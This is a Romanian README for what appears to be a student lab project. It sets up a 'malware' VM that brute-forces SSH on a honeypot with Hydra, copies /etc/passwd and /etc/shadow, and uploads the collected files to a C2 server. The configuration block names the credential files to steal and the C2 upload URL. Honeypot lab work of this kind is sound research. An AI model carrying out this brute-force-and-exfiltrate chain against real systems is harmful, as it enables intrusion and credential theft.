# Malware VM Setup

Acest README descrie setup-ul necesar pentru rularea scriptului de malware care se conectează la VM-ul HoneypotProxy și trimite fișiere către serverul C2.

---

## 1. Dependențe Python

Scriptul folosește următoarele librării Python:

- `paramiko` – pentru SSH
- `requests` – pentru upload către serverul C2

Instalează-le astfel:

```bash
sudo apt update
sudo apt install python3-pip -y
pip3 install paramiko requests
````

---

## 2. Hydra

Scriptul foloseste Hydra pentru a afla parola SSH:

```bash
sudo apt install hydra -y
```

* Asigură-te că fișierul de parole (`/path/to/passwords.txt`) există și conține parolele pe care vrei să le testezi.

---

## 3. Certificate pentru HTTPS

Pentru a putea descărca pagini și a urca fișiere pe C2 prin HTTPS fără a dezactiva verificarea SSL (verify=False), trebuie să instalezi certificatele auto-semnate pe VM-ul Malware.

Copiază certificatul de la mitmproxy (dacă e folosit pe HoneypotProxy):
```bash
sudo scp <HONEYPOT_USER>@<HONEYPOT_IP>:/path/to/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy-ca.crt
```

Copiază certificatul de la C2 server:
```bash
sudo scp <C2_USER>@<C2_IP>:/path/to/c2server-ca.pem /usr/local/share/ca-certificates/c2server-ca.crt
```

Actualizează store-ul de certificate:
```bash
sudo update-ca-certificates
```

Verifică că certificatele sunt recunoscute:
```bash
ls -l /etc/ssl/certs | grep c2server
ls -l /etc/ssl/certs | grep mitmproxy
```

## 4. Configurarea scriptului

Editează variabilele din scriptul `malware_script.py`:

```python
HONEYPOT_HOST = "<IP_HONEYPOTPROXY>"         # IP-ul HoneypotProxy
HONEYPOT_USER = "honeypotproxy"         # User valid pe HoneypotProxy
REMOTE_FILES = ["/etc/passwd", "/etc/shadow"]  # Fișiere de extras
C2_URL = "https://<IP_C2SERVER>:5000/upload"  # URL-ul serverului C2

# Path către certificatele instalate
MITM_CA_PATH = "/usr/local/share/ca-certificates/mitmproxy-ca.crt"
C2SERVER_CA_PATH = "/usr/local/share/ca-certificates/c2server-ca.crt"

# Fișierele descărcate de pe pagini web
DOWNLOAD_DIR = "downloaded_pages"
URLS_FILE = "/home/malware/proiect-practica/malware/url_list.txt"  # optional
```

Inlocuieste <IP_HONEYPOTPROXY> si <IP_C2SERVER> cu valorile corespunzatoare.

---

## 5. Rulare script

Rulează manual scriptul:

```bash
python3 malware_script.py
```

* Scriptul va:

  1. Rula Hydra pentru a afla parola SSH.
  2. Conecta la HoneypotProxy prin SSH și explora structura sistemului de fișiere.
  3. Descărca fișierele specificate (`REMOTE_FILE`).
  4. Descărca paginile listate în URL_LIST sau în url_list.txt
  5. Trimite toate fișierele colectate către serverul C2 prin HTTPS folosind certificatele auto-semnate instalate.

---

## 6. Rețea și firewall

* Asigură-te că VM-ul malware poate accesa HoneypotProxy pe **portul 22 (SSH)**.
* Dacă serverul C2 este local, asigură-te că portul 5000 nu e blocat de firewall.

---

## 7. Fișiere rezultate

* `filesystem_map.txt` – structura sistemului de fișiere explorată.
* `passwd` – fișierul copiat de pe HoneypotProxy.
* 'downloaded_pages/' – paginile web descărcate.

